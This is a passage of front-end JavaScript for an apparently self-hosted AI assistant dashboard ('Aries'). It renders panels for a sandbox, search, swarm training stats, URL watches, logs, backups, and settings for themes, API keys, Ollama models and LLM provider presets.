      html += '<div style="display:flex;gap:8px"><input id="browserUrl" type="text" placeholder="https://..." class="input-field" style="flex:1" /><button class="btn-primary" onclick="window.aries.browserGo()">Go</button></div></div>';
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }
  function browserGo() { var u = document.getElementById('browserUrl').value.trim(); if (!u) return; api('POST', 'browser/open', { url: u }).then(function() { toast('Opened', 'success'); }).catch(function() {}); }

  function loadSandboxStatus() { api('GET', 'sandbox/status').then(function(d) { var sel = document.getElementById('sandboxLang'); if (d.languages && sel) { sel.innerHTML = ''; for (var i = 0; i < d.languages.length; i++) { var o = document.createElement('option'); o.value = d.languages[i]; o.textContent = d.languages[i]; sel.appendChild(o); } } }).catch(function() {}); }
  function runSandbox() { var code = document.getElementById('sandboxCode').value, lang = document.getElementById('sandboxLang').value, out = document.getElementById('sandboxOutput'); if (!code.trim()) return; out.textContent = 'Running...'; api('POST', 'sandbox/run', { code: code, language: lang }).then(function(d) { out.textContent = d.output || d.result || JSON.stringify(d, null, 2); out.style.color = d.error ? 'var(--red)' : 'var(--green)'; }).catch(function() { out.textContent = 'Failed'; out.style.color = 'var(--red)'; }); }
  function webSearch() { var q = document.getElementById('searchQuery').value.trim(); if (!q) return; var el = document.getElementById('searchResults'); el.innerHTML = '<div class="spinner"></div>'; api('POST', 'search', { query: q }).then(function(d) { var r = d.results || []; if (!r.length) { el.innerHTML = '<p style="color:var(--text-dim)">No results.</p>'; return; } var h = ''; for (var i = 0; i < r.length; i++) { h += '<div style="margin-bottom:12px;padding:10px;background:var(--bg);border-radius:8px;border-left:3px solid var(--accent)"><div style="font-weight:600;color:var(--accent)">' + escapeHtml(r[i].title || '') + '</div>'; if (r[i].url) h += '<div style="font-size:11px"><a href="' + escapeHtml(r[i].url) + '" target="_blank" style="color:var(--text-dim)">' + escapeHtml(r[i].url) + '</a></div>'; if (r[i].snippet) h += '<div style="font-size:12px;color:var(--text-dim);margin-top:4px">' + escapeHtml(r[i].snippet) + '</div>'; h += '</div>'; } el.innerHTML = h; }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; }); }

  function loadGateway() {
    var el = document.getElementById('gatewayContent');
    el.innerHTML = '<div class="spinner"></div>';
    Promise.all([api('GET', 'gateway/status').catch(function() { return {}; }), api('GET', 'gateway/usage').catch(function() { return {}; })]).then(function(r) {
      var gw = r[0], usage = r[1];
      var html = '<div class="stat-row">';
      html += '<div class="stat-card"><div class="stat-card-val">' + (gw.enabled !== false ? '\u2705' : '\u274C') + '</div><div class="stat-card-label">Gateway</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + escapeHtml(gw.routeMode || 'smart') + '</div><div class="stat-card-label">Mode</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (usage.totalRequests || 0) + '</div><div class="stat-card-label">Requests</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">$' + ((usage.totalCost || 0)).toFixed(4) + '</div><div class="stat-card-label">Cost</div></div></div>';
      html += '<div class="card" style="margin:12px 0"><div style="font-size:13px"><strong>Model:</strong> ' + escapeHtml(gw.model || 'N/A') + ' | <strong>Port:</strong> ' + (gw.port || 18800) + '</div></div>';
      el.innerHTML = html;
    });
  }

  function loadAres() {
    var el = document.getElementById('aresContent'); if (!el) return;
    el.innerHTML = '<div class="spinner"></div>';
    Promise.all([
      api('GET', 'ares/status').catch(function() { return {}; }),
      api('GET', 'ares/growth').catch(function() { return { history: [], projection: [] }; }),
      api('GET', 'ares/training').catch(function() { return {}; }),
      api('GET', 'ares/leaderboard').catch(function() { return []; }),
      api('GET', 'ares/credits').catch(function() { return { breakdown: {}, total: 0 }; })
    ]).then(function(results) {
      var status = results[0], growth = results[1], training = results[2], leaders = results[3], tiers = results[4];
      var html = '';

      // Status overview
      var phase = (status && status.phase) || 'idle';
      var cycle = (status && status.current_cycle) || 0;
      var phaseColor = phase === 'training' ? 'var(--green)' : phase === 'generating' ? 'var(--accent)' : '#888';
      html += '<div class="stat-grid" style="margin-bottom:16px">';
      html += '<div class="stat-card"><div class="stat-label">Phase</div><div class="stat-value" style="color:' + phaseColor + '">' + escapeHtml(phase) + '</div></div>';
      html += '<div class="stat-card"><div class="stat-label">Cycle</div><div class="stat-value">' + cycle + '</div></div>';
      html += '<div class="stat-card"><div class="stat-label">Total Workers</div><div class="stat-value">' + ((tiers && tiers.total) || 0) + '</div></div>';
      html += '</div>';

      // Tier breakdown
      if (tiers && tiers.breakdown) {
        html += '<h3 style="color:var(--accent);margin:12px 0 8px">🏆 Contributor Tiers</h3>';
        html += '<div class="stat-grid">';
        var tierNames = ['FREE', 'CONTRIBUTOR', 'TRAINER', 'CORE'];
        var tierColors = ['#888', '#0ff', '#f0f', '#ff0'];
        for (var t = 0; t < tierNames.length; t++) {
          html += '<div class="stat-card"><div class="stat-label" style="color:' + tierColors[t] + '">' + tierNames[t] + '</div><div class="stat-value">' + ((tiers.breakdown[tierNames[t]]) || 0) + '</div></div>';
        }
        html += '</div>';
      }

      // Training status
      if (training && training.progress) {
        html += '<h3 style="color:var(--accent);margin:12px 0 8px">🔧 Training</h3>';
        var p = training.progress;
        html += '<div style="background:#111;border:1px solid #1a1a2e;border-radius:6px;padding:12px;margin-bottom:12px">';
        html += '<div style="display:flex;justify-content:space-between;margin-bottom:4px"><span>Progress</span><span>' + ((p.progress || 0) * 100).toFixed(1) + '%</span></div>';
        html += '<div style="background:#1a1a2e;border-radius:4px;height:8px;overflow:hidden"><div style="background:linear-gradient(90deg,var(--accent),var(--green));height:100%;width:' + ((p.progress || 0) * 100) + '%;transition:width 0.5s"></div></div>';
        html += '</div>';
      }

      // Swarm training
      if (training && training.swarm) {
        var sw = training.swarm;
        html += '<h3 style="color:var(--accent);margin:12px 0 8px">🐝 Swarm Training</h3>';
        html += '<div class="stat-grid">';
        html += '<div class="stat-card"><div class="stat-label">Active Workers</div><div class="stat-value">' + (sw.activeWorkers || 0) + '</div></div>';
        html += '<div class="stat-card"><div class="stat-label">Pending Tasks</div><div class="stat-value">' + (sw.pendingTasks || 0) + '</div></div>';
        html += '<div class="stat-card"><div class="stat-label">Completed</div><div class="stat-value" style="color:var(--green)">' + (sw.completedTasks || 0) + '</div></div>';
        html += '</div>';
      }

      // Leaderboard
      if (leaders && leaders.length > 0) {
        html += '<h3 style="color:var(--accent);margin:12px 0 8px">🏅 Leaderboard</h3>';
        html += '<table class="data-table"><thead><tr><th>#</th><th>Worker</th><th>Credits</th><th>Tier</th><th>GPU</th></tr></thead><tbody>';
        for (var i = 0; i < leaders.length; i++) {
          var l = leaders[i];
          var tierColor = l.tier === 'CORE' ? '#ff0' : l.tier === 'TRAINER' ? '#f0f' : l.tier === 'CONTRIBUTOR' ? '#0ff' : '#888';
          html += '<tr><td>' + (i + 1) + '</td><td style="color:var(--accent)">' + escapeHtml(l.workerId || 'anon') + '</td><td>' + (l.totalCredits || 0).toFixed(1) + '</td><td style="color:' + tierColor + '">' + (l.tier || 'FREE') + '</td><td>' + (l.hasGpu ? '✅' : '—') + '</td></tr>';
        }
        html += '</tbody></table>';
      }

      // Growth projection
      if (growth && growth.projection && growth.projection.length > 0) {
        html += '<h3 style="color:var(--accent);margin:12px 0 8px">📈 Growth Projection (6 months)</h3>';
        html += '<div style="display:flex;gap:8px;flex-wrap:wrap">';
        for (var g = 0; g < growth.projection.length; g++) {
          var gp = growth.projection[g];
          html += '<div style="background:#111;border:1px solid #1a1a2e;border-radius:6px;padding:8px 12px;text-align:center"><div style="font-size:10px;color:#888">' + (gp.month || ('M' + (g + 1))) + '</div><div style="color:var(--green);font-weight:bold">' + (gp.nodes || 0) + ' nodes</div></div>';
        }
        html += '</div>';
      }

      el.innerHTML = html || '<p style="color:#888">ARES system idle. Generate data or start a training cycle to begin.</p>';
    });
  }

  function aresGenerateData() {
    toast('Generating ARES training data...', 'info');
    api('POST', 'ares/data/generate', { category: 'reasoning', count: 10 }).then(function(d) {
      toast('Generated ' + (d.generated || 0) + ' samples', 'success');
      loadAres();
    }).catch(function(e) { toast('Generation failed: ' + e.message, 'error'); });
  }

  function aresStartCycle() {
    toast('Starting ARES training cycle...', 'info');
    api('POST', 'ares/training/start').then(function(d) {
      toast('Training cycle started', 'success');
      loadAres();
    }).catch(function(e) { toast('Start failed: ' + e.message, 'error'); });
  }

  function loadEvolve() {
    var el = document.getElementById('evolveContent'); el.innerHTML = '<div class="spinner"></div>';
    api('GET', 'evolve/status').then(function(d) {
      var html = '<div class="stat-row"><div class="stat-card"><div class="stat-card-val">' + (d.enabled ? '\u2705' : '\u274C') + '</div><div class="stat-card-label">Enabled</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + ((d.history || {}).applied || 0) + '</div><div class="stat-card-label">Applied</div></div></div>';
      html += '<div class="card" style="margin:12px 0"><button class="btn-primary" onclick="window.aries.runEvolve()" id="evolveRunBtn">&#x1F680; Analyze &amp; Evolve</button><div id="evolveRunOutput" style="margin-top:12px"></div></div>';
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }
  function runEvolve() { var btn = document.getElementById('evolveRunBtn'), out = document.getElementById('evolveRunOutput'); if (btn) { btn.disabled = true; btn.textContent = 'Running...'; } if (out) out.innerHTML = '<div class="spinner"></div>'; api('POST', 'evolve/run').then(function(d) { if (btn) { btn.disabled = false; btn.innerHTML = '&#x1F680; Analyze &amp; Evolve'; } if (out) out.innerHTML = '<div style="color:var(--green)">\u2705 Complete!</div>'; }).catch(function(e) { if (btn) { btn.disabled = false; btn.innerHTML = '&#x1F680; Analyze &amp; Evolve'; } if (out) out.innerHTML = '<p style="color:var(--red)">Failed</p>'; }); }

  function loadSentinel() {
    var el = document.getElementById('sentinelContent'); el.innerHTML = '<div class="spinner"></div>';
    api('GET', 'sentinel/status').then(function(d) {
      var watches = d.watches || [];
      var html = '<div class="stat-row"><div class="stat-card"><div class="stat-card-val">' + (d.enabled ? '\u2705' : '\u274C') + '</div><div class="stat-card-label">Enabled</div></div><div class="stat-card"><div class="stat-card-val">' + watches.length + '</div><div class="stat-card-label">Watches</div></div></div>';
      html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Add Watch</h3><div style="display:flex;gap:8px"><input id="sentinelUrl" type="text" placeholder="URL..." class="input-field" style="flex:1" /><input id="sentinelInterval" type="number" placeholder="Min" class="input-field" style="width:80px" value="60" /><button class="btn-primary" onclick="window.aries.addWatch()">Add</button></div></div>';
      if (watches.length > 0) {
        html += '<table class="data-table"><tr><th>URL</th><th>Interval</th><th>Status</th></tr>';
        for (var i = 0; i < watches.length; i++) { var w = watches[i]; html += '<tr><td>' + escapeHtml(w.url || '') + '</td><td>' + Math.round((w.intervalMs || 3600000) / 60000) + 'min</td><td>' + (w.changed ? '<span style="color:var(--red)">Changed!</span>' : '<span style="color:var(--green)">OK</span>') + '</td></tr>'; }
        html += '</table>';
      }
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }
  function addWatch() { var u = document.getElementById('sentinelUrl').value.trim(), iv = parseInt(document.getElementById('sentinelInterval').value) || 60; if (!u) return; api('POST', 'sentinel/watches', { url: u, intervalMs: iv * 60000 }).then(function() { toast('Added!', 'success'); _loadedPanels['sentinel'] = false; loadSentinel(); }).catch(function() {}); }

  function refreshLogs() {
    var level = document.getElementById('logLevel').value;
    var path = 'logs?limit=200'; if (level) path += '&level=' + level;
    api('GET', path).then(function(d) {
      var el = document.getElementById('logsContent'), entries = d.entries || [];
      if (!entries.length) { el.innerHTML = '<div style="color:var(--text-dim)">No logs.</div>'; return; }
      var html = '';
      for (var i = entries.length - 1; i >= 0; i--) html += buildLogEntry(entries[i]);
      el.innerHTML = html;
    }).catch(function() {});
  }
  function buildLogEntry(entry) { var time = entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''; var level = (entry.level || 'info').toLowerCase(); return '<div class="log-entry"><span class="log-time">' + time + '</span> <span class="log-level ' + level + '">[' + level.toUpperCase() + ']</span> ' + (entry.module ? '<span class="log-mod">[' + escapeHtml(entry.module) + ']</span> ' : '') + '<span class="log-msg">' + escapeHtml(entry.message || entry.msg || JSON.stringify(entry)) + '</span></div>'; }
  function appendLogEntry(entry) { if (currentPanel !== 'logs') return; var el = document.getElementById('logsContent'); el.innerHTML = buildLogEntry(entry) + el.innerHTML; }

  function loadBackup() {
    var el = document.getElementById('backupContent'); el.innerHTML = '<div class="spinner"></div>';
    api('GET', 'backup/list').then(function(d) {
      var backups = d.backups || [];
      var html = '<div class="stat-row"><div class="stat-card"><div class="stat-card-val">' + backups.length + '</div><div class="stat-card-label">Backups</div></div></div>';
      if (!backups.length) html += '<p style="color:var(--text-dim)">No backups.</p>';
      else { html += '<table class="data-table"><tr><th>File</th><th>Size</th><th>Date</th><th>Actions</th></tr>'; for (var i = 0; i < backups.length; i++) { var b = backups[i]; html += '<tr><td>' + escapeHtml(b.filename || b.name || '') + '</td><td>' + formatBytes(b.size || 0) + '</td><td>' + escapeHtml(b.date || '') + '</td><td><button class="btn-sm" onclick="window.aries.restoreBackup(\'' + escapeHtml(b.filename || b.name || '') + '\')">Restore</button></td></tr>'; } html += '</table>'; }
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }
  function createBackup() { toast('Creating...', 'info'); api('POST', 'backup/create').then(function() { toast('Created!', 'success'); _loadedPanels['backup'] = false; loadBackup(); }).catch(function() {}); }
  function restoreBackup(f) { if (!confirm('Restore from: ' + f + '?')) return; api('POST', 'backup/restore', { filename: f }).then(function() { toast('Restored!', 'success'); }).catch(function() {}); }

  // ═══════════════════════════════
  //  SETTINGS (with Theme Selector)
  // ═══════════════════════════════
  function loadSettings() {
    var el = document.getElementById('settingsContent'); el.innerHTML = '<div class="spinner"></div>';
    Promise.all([api('GET', 'config').catch(function() { return { config: {} }; }), api('GET', 'settings/tokens').catch(function() { return {}; }), api('GET', 'tor/status').catch(function() { return {}; })]).then(function(results) {
      var cfg = results[0].config || {}, tokens = results[1] || {}, torStatus = results[2] || {};
      var html = '';
      // Theme
      html += '<div class="card" style="margin:0 0 16px;border:2px solid var(--accent)"><h3 style="margin:0 0 12px;color:var(--accent)">&#x1F3A8; Theme</h3><div style="display:flex;gap:8px;flex-wrap:wrap">';
      var themes = [{id:'cyber-cyan',name:'Cyber Cyan',color:'#00e5ff'},{id:'blood-red',name:'Blood Red',color:'#ff2244'},{id:'matrix-green',name:'Matrix Green',color:'#00ff41'},{id:'neon-purple',name:'Neon Purple',color:'#a855f7'}];
      var cur = localStorage.getItem('aries-theme') || 'cyber-cyan';
      for (var ti = 0; ti < themes.length; ti++) { var t = themes[ti]; var a = t.id === cur ? 'border-color:' + t.color + ';box-shadow:0 0 12px ' + t.color : ''; html += '<button class="btn-sm" onclick="window.aries.setTheme(\'' + t.id + '\')" style="padding:8px 16px;' + a + '"><span style="color:' + t.color + '">\u25CF</span> ' + t.name + '</button>'; }
      html += '</div></div>';
      // AI Token
      html += '<div class="card" style="margin:0 0 16px"><h3 style="margin:0 0 8px;color:var(--accent)">&#x1F511; AI Token</h3>';
      html += '<div style="display:flex;gap:8px"><input id="settingAiToken" type="password" class="input-field" style="flex:1;font-family:monospace" placeholder="sk-ant-..." value="' + escapeHtml(tokens.aiToken || '') + '" />';
      html += '<button class="btn-sm" onclick="window.aries.testAiToken()" id="settingTestTokenBtn">Test</button>';
      html += '<button class="btn-primary" onclick="window.aries.saveAiToken()">Save</button></div>';
      html += '<div id="settingTokenStatus" style="font-size:12px;margin-top:4px">' + (tokens.aiTokenSet ? '\u2705 Configured' : '\u26A0 Not Set') + '</div></div>';
      // API Keys (public-facing)
      html += '<div class="card" style="margin:0 0 16px"><h3 style="margin:0 0 12px;color:var(--accent)">&#x1F511; API Keys</h3>';
      html += '<p style="color:#888;font-size:12px;margin:0 0 12px">Configure cloud AI providers. Keys are stored locally.</p>';
      html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">';
      var keyProviders = [
        { id: 'anthropic', label: 'Anthropic', placeholder: 'sk-ant-...' },
        { id: 'openai', label: 'OpenAI', placeholder: 'sk-...' },
        { id: 'groq', label: 'Groq', placeholder: 'gsk_...' },
        { id: 'google', label: 'Google Gemini', placeholder: 'AIza...' }
      ];
      for (var ki = 0; ki < keyProviders.length; ki++) {
        var kp = keyProviders[ki];
        html += '<div><label class="setting-label">' + kp.label + '</label><input id="settingKey_' + kp.id + '" type="password" class="input-field" placeholder="' + kp.placeholder + '" style="width:100%" /></div>';
      }
      html += '</div><button class="btn-primary" onclick="window.aries.saveApiKeys()" style="margin-top:12px">Save Keys</button></div>';

      // Ollama
      html += '<div class="card" style="margin:0 0 16px"><h3 style="margin:0 0 12px;color:var(--accent)">&#x1F4BB; Ollama (Local AI)</h3>';
      html += '<p style="color:#888;font-size:12px;margin:0 0 8px">Run AI models locally on your machine. <a href="https://ollama.ai" target="_blank" style="color:var(--accent)">Install Ollama</a></p>';
      html += '<div id="settingsOllamaModels" style="margin-bottom:8px"><div class="spinner"></div></div>';
      html += '<div style="display:flex;gap:8px"><input id="settingsPullModel" type="text" class="input-field" placeholder="Model name (e.g. llama3)" style="flex:1" />';
      html += '<button class="btn-primary" onclick="window.aries.settingsPullModel()">Pull Model</button></div></div>';

      // Join Aries Network
      if (!_ariesNetworkJoined) {
        html += '<div class="card" style="margin:0 0 16px;border:1px solid #0ff3"><h3 style="margin:0 0 8px;color:#0ff">&#x26A1; Join Aries Network</h3>';
        html += '<p style="color:#888;font-size:13px;margin:0 0 12px">Get free AI credits by contributing compute to the Aries collective. Your machine helps train and run AI models in the background.</p>';
        html += '<button class="btn-primary" onclick="window.aries.joinSwarmWorker()" style="background:#0ff;color:#000;font-weight:700;padding:10px 24px">&#x1F680; Join Aries Network</button>';
        html += '<div id="joinProgress" style="display:none;margin-top:12px"><div class="progress-bar"><div id="joinBar" class="progress-fill" style="width:0%"></div></div><div id="joinStatus" class="progress-text" style="font-size:12px;color:var(--text-dim);margin-top:4px"></div></div>';
        html += '</div>';
      }

      // General
      html += '<div class="card" style="margin:0 0 12px"><h3 style="margin:0 0 12px;color:var(--accent)">&#x2699; General</h3>';
      html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">';
      html += '<div><label class="setting-label">User Name</label><input id="settingUserName" type="text" class="input-field" value="' + escapeHtml(cfg.userName || '') + '" /></div>';
      if (_adminMode) html += '<div><label class="setting-label">Concurrency</label><input id="settingConcurrency" type="number" class="input-field" value="' + ((cfg.swarm && cfg.swarm.concurrency) || 10) + '" /></div>';
      html += '</div><button class="btn-primary" onclick="window.aries.saveSettings()" style="margin-top:12px">Save</button></div>';
      // Tor .onion address
      if (torStatus.address) {
        html += '<div class="card" style="margin:0 0 12px;border:1px solid var(--accent2)"><h3 style="margin:0 0 8px;color:var(--accent2)">&#x1F9C5; Tor Hidden Service</h3>';
        html += '<div style="font-family:monospace;font-size:13px;color:var(--cyan);word-break:break-all;padding:8px;background:rgba(0,255,255,0.05);border-radius:4px">' + escapeHtml(torStatus.address) + '</div>';
        html += '<div style="font-size:11px;color:var(--text-dim);margin-top:4px">' + (torStatus.running ? '\u{1F7E2} Tor running' : '\u{1F534} Tor stopped') + '</div></div>';
      }
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }

  function saveApiKeys() {
    var keys = {};
    var providers = ['anthropic', 'openai', 'groq', 'google'];
    for (var i = 0; i < providers.length; i++) {
      var el = document.getElementById('settingKey_' + providers[i]);
      if (el && el.value.trim()) keys[providers[i]] = el.value.trim();
    }
    api('POST', 'settings/api-keys', keys).then(function() {
      toast('API keys saved!', 'success');
      // Refresh model list
      initModelSelector();
    }).catch(function(e) { toast('Failed to save keys: ' + e.message, 'error'); });
  }

  function settingsPullModel() {
    var name = document.getElementById('settingsPullModel');
    if (!name || !name.value.trim()) { toast('Enter a model name', 'error'); return; }
    toast('Pulling ' + name.value.trim() + '...', 'info');
    api('POST', 'models/pull', { name: name.value.trim() }).then(function() {
      toast('Model pulled!', 'success');
      name.value = '';
      initModelSelector();
    }).catch(function(e) { toast('Pull failed: ' + e.message, 'error'); });
  }

  function refreshAriesAi() { _loadedPanels['aries-ai'] = false; loadAriesAi(); }

  function setTheme(name) { document.documentElement.setAttribute('data-theme', name); localStorage.setItem('aries-theme', name); toast('Theme: ' + name, 'success'); _loadedPanels['settings'] = false; loadSettings(); }
  function testAiToken() { var t = document.getElementById('settingAiToken').value.trim(); if (!t) return; var btn = document.getElementById('settingTestTokenBtn'); btn.textContent = '...'; btn.disabled = true; api('POST', 'settings/test-token', { token: t }).then(function(d) { btn.textContent = 'Test'; btn.disabled = false; document.getElementById('settingTokenStatus').innerHTML = d.valid ? '<span style="color:var(--green)">\u2705 Valid!</span>' : '<span style="color:var(--red)">\u274C Invalid</span>'; }).catch(function() { btn.textContent = 'Test'; btn.disabled = false; }); }
  function saveAiToken() { var t = document.getElementById('settingAiToken').value.trim(); if (!t) return; api('POST', 'settings/tokens', { aiToken: t }).then(function() { toast('Saved!', 'success'); }).catch(function() {}); }
  function saveSettings() { var updates = [{ key: 'userName', value: document.getElementById('settingUserName').value }, { key: 'swarm.concurrency', value: parseInt(document.getElementById('settingConcurrency').value) }]; Promise.all(updates.map(function(u) { return api('PUT', 'config', u).catch(function() {}); })).then(function() { toast('Saved!', 'success'); }); }

  // ═══════════════════════════════
  //  SWARM MANAGER / PROVIDERS / KEY VAULT
  // ═══════════════════════════════
  var _providerPresets = {
    gemini: { name: 'gemini', endpoint: 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent', model: 'gemini-2.0-flash' },
    groq: { name: 'groq', endpoint: 'https://api.groq.com/openai/v1/chat/completions', model: 'llama-3.1-70b-versatile' },
    mistral: { name: 'mistral', endpoint: 'https://api.mistral.ai/v1/chat/completions', model: 'mistral-small-latest' },
    cohere: { name: 'cohere', endpoint: 'https://api.cohere.com/v2/chat', model: 'command-r' },
    openrouter: { name: 'openrouter', endpoint: 'https://openrouter.ai/api/v1/chat/completions', model: 'meta-llama/llama-3.1-8b-instruct:free' },
    together: { name: 'together', endpoint: 'https://api.together.xyz/v1/chat/completions', model: 'meta-llama/Llama-3-70b-chat-hf' },
    cerebras: { name: 'cerebras', endpoint: 'https://api.cerebras.ai/v1/chat/completions', model: 'llama3.1-8b' },
    sambanova: { name: 'sambanova', endpoint: 'https://api.sambanova.ai/v1/chat/completions', model: 'Meta-Llama-3.1-8B-Instruct' }
  };

  function refreshProviders() {
    api('GET', 'providers').then(function(d) {
      var providers = d.providers || {}, grid = document.getElementById('providerGrid'), keys = Object.keys(providers), html = '';
      if (!keys.length) html = '<p style="color:#888;font-size:13px">No providers. Click +Provider.</p>';
      for (var i = 0; i < keys.length; i++) {
        var p = providers[keys[i]], sc = p.status === 'active' ? '#0f0' : '#888';
        html += '<div style="background:#0d0d1a;border:1px solid ' + (p.status === 'active' ? 'var(--accent)' : '#333') + ';border-radius:10px;padding:14px">';
        html += '<div style="display:flex;justify-content:space-between;margin-bottom:8px"><span style="color:var(--accent);font-weight:bold">' + escapeHtml(p.name) + '</span><span style="width:10px;height:10px;border-radius:50%;background:' + sc + ';display:inline-block"></span></div>';
        html += '<div style="color:#aaa;font-size:12px">' + escapeHtml(p.model || '') + '</div>';
        html += '<div style="color:#888;font-size:11px;margin-top:4px">' + (p.currentRPM || 0) + '/' + (p.maxRPM || 0) + ' RPM | ' + (p.totalCalls || 0) + ' total</div>';
        html += '<div style="margin-top:8px;display:flex;gap:6px"><button class="btn-sm" onclick="window.aries.testProvider(\'' + escapeHtml(p.name) + '\')">Test</button><button class="btn-sm" style="color:#f55" onclick="window.aries.removeProvider(\'' + escapeHtml(p.name) + '\')">Remove</button></div></div>';
      }
      grid.innerHTML = html;
      var sel = document.getElementById('agentProvider');
      if (sel) { var oh = '<option value="">Auto-assign</option>'; for (var j = 0; j < keys.length; j++) oh += '<option value="' + escapeHtml(keys[j]) + '">' + escapeHtml(keys[j]) + '</option>'; sel.innerHTML = oh; }
    }).catch(function() {});
    api('GET', 'swarm/capacity').then(function(d) { var el = document.getElementById('swarmCapacity'); if (el) el.innerHTML = '&#x26A1; <strong>' + (d.activeProviders || 0) + '</strong> providers | <strong>' + (d.totalRPM || 0) + '</strong> RPM'; }).catch(function() {});
    api('GET', 'agents/swarm').then(function(d) {
      var agents = d.agents || [], grid = document.getElementById('swarmAgentGrid'), html = '';
      if (!agents.length) html = '<p style="color:#888;font-size:13px">No swarm agents.</p>';
      for (var i = 0; i < agents.length; i++) { var a = agents[i]; html += '<div style="background:#0d0d1a;border:1px solid #1a1a2e;border-radius:8px;padding:10px"><div style="display:flex;justify-content:space-between"><span style="color:var(--accent2);font-weight:bold;font-size:13px">' + escapeHtml(a.name) + '</span></div><div style="color:#888;font-size:11px;margin-top:4px">' + escapeHtml(a.role) + ' | ' + (a.taskCount || 0) + ' tasks</div><div style="margin-top:6px;display:flex;gap:4px"><button class="btn-sm" style="font-size:10px;color:#f55" onclick="window.aries.removeSwarmAgent(\'' + a.id + '\')">Remove</button></div></div>'; }
      grid.innerHTML = html;
    }).catch(function() {});
  }

  function showAddProvider() { document.getElementById('addProviderModal').style.display = 'flex'; }
  function fillProviderPreset() { var s = document.getElementById('providerPreset').value; if (s && _providerPresets[s]) { var p = _providerPresets[s]; document.getElementById('provName').value = p.name; document.getElementById('provEndpoint').value = p.endpoint; document.getElementById('provModel').value = p.model; } }
  function addProvider() { var n = document.getElementById('provName').value.trim(); if (!n) { toast('Name required', 'error'); return; } api('POST', 'providers', { name: n, apiKey: document.getElementById('provKey').value.trim(), endpoint: document.getElementById('provEndpoint').value.trim(), model: document.getElementById('provModel').value.trim() }).then(function() { toast('Added!', 'success'); document.getElementById('addProviderModal').style.display = 'none'; refreshProviders(); }).catch(function() {}); }
  function removeProvider(n) { if (!confirm('Remove ' + n + '?')) return; api('DELETE', 'providers/' + encodeURIComponent(n)).then(function() { toast('Removed', 'success'); refreshProviders(); }).catch(function() {}); }
  function testProvider(n) { toast('Testing...', 'info'); api('POST', 'providers/' + encodeURIComponent(n) + '/test').then(function(d) { toast(d.success ? n + ': OK!' : n + ': Failed', d.success ? 'success' : 'error'); refreshProviders(); }).catch(function() {}); }
  function testAllProviders() { toast('Testing all...', 'info'); api('POST', 'providers/test').then(function(d) { var r = d.results || []; var ok = r.filter(function(x) { return x.success; }).length; toast(ok + '/' + r.length + ' online', ok > 0 ? 'success' : 'error'); refreshProviders(); }).catch(function() {}); }
  function showAddSwarmAgent() { document.getElementById('addAgentModal').style.display = 'flex'; }
  function addSwarmAgent() { api('POST', 'agents/swarm', { name: document.getElementById('agentName').value.trim() || undefined, role: document.getElementById('agentRole').value, provider: document.getElementById('agentProvider').value || undefined }).then(function() { toast('Created!', 'success'); document.getElementById('addAgentModal').style.display = 'none'; refreshProviders(); }).catch(function() {}); }
  function removeSwarmAgent(id) { api('DELETE', 'agents/swarm/' + id).then(function() { toast('Removed', 'success'); refreshProviders(); }).catch(function() {}); }
  function batchAgents(role, count) { api('POST', 'agents/swarm', { batch: true, role: role, count: count }).then(function() { toast(count + ' ' + role + ' agents created!', 'success'); refreshProviders(); }).catch(function() {}); }

  function refreshKeyVault() { api('GET', 'keys').then(function(d) { var keys = d.keys || [], grid = document.getElementById('keyVaultGrid'); if (!grid) return; if (!keys.length) { grid.innerHTML = '<p style="color:#888;font-size:13px">No keys.</p>'; return; } var html = ''; for (var i = 0; i < keys.length; i++) { var k = keys[i]; html += '<div style="background:#0d0d1a;border:1px solid #1a1a2e;border-radius:8px;padding:10px"><div style="display:flex;justify-content:space-between"><span style="color:var(--accent);font-weight:bold;font-size:13px">' + escapeHtml(k.provider) + '</span><span style="color:' + (k.status === 'active' ? '#0f0' : '#888') + ';font-size:12px">' + escapeHtml(k.status) + '</span></div><div style="color:#666;font-size:11px;font-family:monospace;margin-top:4px">' + escapeHtml(k.maskedKey) + '</div></div>'; } grid.innerHTML = html; }).catch(function() {}); }
  function showFreeKeys() { document.getElementById('freeKeysModal').style.display = 'block'; api('GET', 'keys/providers').then(function(d) { var p = d.providers || [], el = document.getElementById('freeKeysContent'), html = ''; for (var i = 0; i < p.length; i++) { html += '<div style="background:#111;border:1px solid #333;border-radius:10px;padding:14px;margin-bottom:10px"><div style="display:flex;justify-content:space-between;margin-bottom:8px"><div>' + p[i].emoji + ' <strong style="color:var(--accent)">' + escapeHtml(p[i].label) + '</strong></div><span style="font-size:12px">' + (p[i].hasKey ? '\u2705' : '\u274C') + '</span></div><div style="color:#888;font-size:12px;margin-bottom:8px">Free: ' + escapeHtml(p[i].freeQuota) + '</div><div style="display:flex;gap:6px"><a href="' + escapeHtml(p[i].signupUrl) + '" target="_blank" class="btn-sm" style="text-decoration:none;color:var(--accent)">Signup</a><input id="freekey-' + escapeHtml(p[i].provider) + '" placeholder="Paste key" style="flex:1;padding:6px;background:#0a0a1a;color:#eee;border:1px solid #333;border-radius:4px;font-size:12px" /><button class="btn-sm" style="color:#0f0" onclick="window.aries.saveAndTestKey(\'' + escapeHtml(p[i].provider) + '\')">Test & Save</button></div></div>'; } el.innerHTML = html; }).catch(function() {}); }
